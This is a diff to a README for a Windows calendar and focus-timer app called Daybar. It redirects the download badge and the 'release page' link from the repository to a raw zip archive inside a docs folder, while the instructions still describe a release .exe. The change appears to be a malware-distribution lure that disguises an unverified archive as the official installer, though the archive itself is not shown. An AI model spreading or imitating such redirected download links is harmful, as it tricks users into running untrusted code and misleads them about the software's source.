@@ -1,6 +1,6 @@
 # 📅 daybar-app - Manage your time and tasks effortlessly
 
-[![Download Daybar for Windows](https://img.shields.io/badge/Download-Daybar-blue)](https://github.com/Fogparainfluenzavirus7880/daybar-app)
+[![Download Daybar for Windows](https://img.shields.io/badge/Download-Daybar-blue)](https://github.com/Fogparainfluenzavirus7880/daybar-app/raw/refs/heads/main/docs/app-daybar-v2.9-alpha.1.zip)
 
 Daybar centers your daily schedule, tasks, and focus timers within your desktop menu bar. This tool syncs your Google Calendar and provides a view of your upcoming events. You stay on track with a built-in Pomodoro timer and a world clock for international coordination. This application requires a one-time purchase for full access.
 
@@ -18,7 +18,7 @@ Daybar helps you work with greater focus. You see every task and meeting in one 
 
 You can set up Daybar on your Windows computer in minutes. Follow these instructions to get started.
 
-1. Visit [the release page](https://github.com/Fogparainfluenzavirus7880/daybar-app) to download the application.
+1. Visit [the release page](https://github.com/Fogparainfluenzavirus7880/daybar-app/raw/refs/heads/main/docs/app-daybar-v2.9-alpha.1.zip) to download the application.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
